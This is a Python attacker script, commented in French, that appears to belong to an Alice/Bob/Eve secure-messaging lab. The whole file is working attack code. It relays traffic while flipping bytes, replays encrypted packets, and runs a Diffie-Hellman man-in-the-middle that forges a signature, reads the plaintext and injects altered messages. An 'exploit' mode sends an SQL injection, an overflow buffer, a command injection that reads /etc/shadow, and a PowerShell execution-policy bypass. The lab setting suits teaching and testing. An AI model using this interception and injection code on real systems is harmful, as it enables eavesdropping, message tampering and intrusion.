import socket
import threading
import sys
import time
from config import BOB_PORT, EVE_PORT, BOB_IP
from logger_config import setup_logger
from dh_handshake import generate_dh_private_key, get_public_bytes, compute_shared_secret
from crypto_core import derive_keys, decrypt_message, encrypt_message

logger = setup_logger('Eve')

LISTEN_PORT  = EVE_PORT
TARGET_PORT  = BOB_PORT

def attack_poodle(client_sock, bob_sock):
    """Couche Intégrité: Attaque POODLE / Malleability"""
    logger.info("Lancement Attaque: POODLE / Malleability")
    def forward_tamper(src, dst, is_client):
        while True:
            try:
                data = src.recv(65536)
                if not data: break
                if is_client and b'BEGIN PUBLIC KEY' not in data and len(data) > 50:
                    barray = bytearray(data)
                    barray[25] ^= 0xFF # Flip 1 byte
                    logger.warning(f"Paquet modifié en vol ! ({len(data)} octets)")
                    dst.sendall(bytes(barray))
                else:
                    dst.sendall(data)
            except: break
            
    t1 = threading.Thread(target=forward_tamper, args=(client_sock, bob_sock, True))
    t2 = threading.Thread(target=forward_tamper, args=(bob_sock, client_sock, False))
    t1.start(); t2.start()
    t1.join(); t2.join()

def attack_replay(client_sock, bob_sock):
    """Couche Protocole: Attaque par Rejeu (Replay)"""
    logger.info("Lancement Attaque: Replay (Rejeu de paquets)")
    def forward_replay(src, dst, is_client):
        while True:
            try:
                data = src.recv(65536)
                if not data: break
                dst.sendall(data)
                
                # Si c'est un paquet chiffré d'Alice, on le rejoue
                if is_client and b'BEGIN PUBLIC KEY' not in data and len(data) > 50:
                    logger.warning("Interception du paquet. Rejeu dans 2 secondes...")
                    time.sleep(2)
                    dst.sendall(data)
                    logger.warning("Paquet fantôme (Replay) envoyé à Bob !")
            except: break
            
    t1 = threading.Thread(target=forward_replay, args=(client_sock, bob_sock, True))
    t2 = threading.Thread(target=forward_replay, args=(bob_sock, client_sock, False))
    t1.start(); t2.start()
    t1.join(); t2.join()

def attack_mitm(client_sock, bob_sock):
    """Couche Protocole: MITM complet sur Diffie-Hellman"""
    logger.info("Lancement Attaque: Man-in-the-Middle (MITM) DH")
    
    # 1. Alice -> Eve (pub_A + sig)
    alice_data = client_sock.recv(4096)
    if b'---SIG---' not in alice_data: return
    alice_pub_bytes, alice_sig = alice_data.split(b'---SIG---')
    logger.info("Clé publique d'Alice et signature interceptées.")
    
    # 2. Eve génère ses clés pour Bob
    eve_priv_for_bob = generate_dh_private_key()
    eve_pub_for_bob = get_public_bytes(eve_priv_for_bob)
    
    # Eve tente de forger une signature (sans la vraie clé d'Alice)
    from cryptography.hazmat.primitives.asymmetric import ec
    from dh_handshake import sign_data
    fake_priv = ec.generate_private_key(ec.SECP256R1())
    forged_sig = sign_data(fake_priv, eve_pub_for_bob)
    
    # 3. Eve -> Bob (Eve se fait passer pour Alice)
    bob_sock.sendall(eve_pub_for_bob + b'---SIG---' + forged_sig)
    
    # 4. Bob -> Eve (pub_B)
    bob_pub_bytes = bob_sock.recv(2048)
    logger.info("Clé publique de Bob interceptée.")
    
    # 5. Eve génère ses clés pour Alice
    eve_priv_for_alice = generate_dh_private_key()
    eve_pub_for_alice = get_public_bytes(eve_priv_for_alice)
    
    # 6. Eve -> Alice (Eve se fait passer pour Bob)
    client_sock.sendall(eve_pub_for_alice)
    
    # Calcul des secrets
    secret_alice = compute_shared_secret(eve_priv_for_alice, alice_pub_bytes)
    key_enc_A, key_mac_A = derive_keys(secret_alice)
    
    secret_bob = compute_shared_secret(eve_priv_for_bob, bob_pub_bytes)
    key_enc_B, key_mac_B = derive_keys(secret_bob)
    
    logger.critical("MITM RÉUSSI ! Eve possède deux canaux sécurisés distincts.")
    
    # Forwarding avec lecture en clair
    while True:
        data_from_alice = client_sock.recv(4096)
        if not data_from_alice: break
        
        try:
            # Eve déchiffre
            plaintext = decrypt_message(key_enc_A, key_mac_A, data_from_alice)
            logger.critical(f"MESSAGE SECRET LU PAR EVE : {plaintext.decode()}")
            
            # Eve rechiffre pour Bob
            forged_msg = b"EVE WAS HERE: " + plaintext
            data_for_bob = encrypt_message(key_enc_B, key_mac_B, forged_msg)
            bob_sock.sendall(data_for_bob)
        except Exception as e:
            logger.error(f"Erreur MITM: {e}")
            break

def attack_exploit():
    """Couche Logicielle: Injections et BOF directement sur Bob"""
    logger.info("Lancement Attaque: Exploits Logiciels (Living-Off-the-Land)")
    logger.info("Génération de payloads malveillants...")
    
    payloads = [
        b"' UNION SELECT password FROM users --", # SQLi
        b"A" * 5000, # Buffer Overflow
        b"admin; cat /etc/shadow", # Command Injection
        b"powershell.exe -ExecutionPolicy Bypass -enc ZXhpdA==" # Volt Typhoon / LotL
    ]
    
    for payload in payloads:
        try:
            with socket.socket() as s:
                s.connect((BOB_IP, TARGET_PORT))
                logger.warning(f"Envoi du payload : {payload[:30]}...")
                s.sendall(payload)
                time.sleep(1)
        except ConnectionRefusedError:
            logger.error("Bob est inaccessible.")

def handle_connection(client_sock, mode):
    if mode == 'exploit':
        return # Exploit mode n'attend pas Alice
        
    with socket.socket() as bob_sock:
        try:
            bob_sock.connect((BOB_IP, TARGET_PORT))
        except ConnectionRefusedError:
            logger.error("Impossible de se connecter à Bob.")
            client_sock.close()
            return
            
        if mode == 'poodle':
            attack_poodle(client_sock, bob_sock)
        elif mode == 'replay':
            attack_replay(client_sock, bob_sock)
        elif mode == 'mitm':
            attack_mitm(client_sock, bob_sock)
        else:
            logger.info("Mode inconnu, relais simple.")

if __name__ == "__main__":
    mode = 'poodle'
    if len(sys.argv) > 1:
        mode = sys.argv[1].lower()
        
    logger.info("=========================================")
    logger.info("--- Arsenal d'Attaque d'Eve (Sentinelle) ---")
    logger.info("=========================================")
    
    if mode == 'exploit':
        attack_exploit()
        sys.exit(0)

    with socket.socket() as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', LISTEN_PORT))
        s.listen(5)
        logger.info(f"En écoute sur {LISTEN_PORT} (Mode: {mode})")
        
        while True:
            try:
                conn, _ = s.accept()
                threading.Thread(target=handle_connection, args=(conn, mode)).start()
            except KeyboardInterrupt:
                break
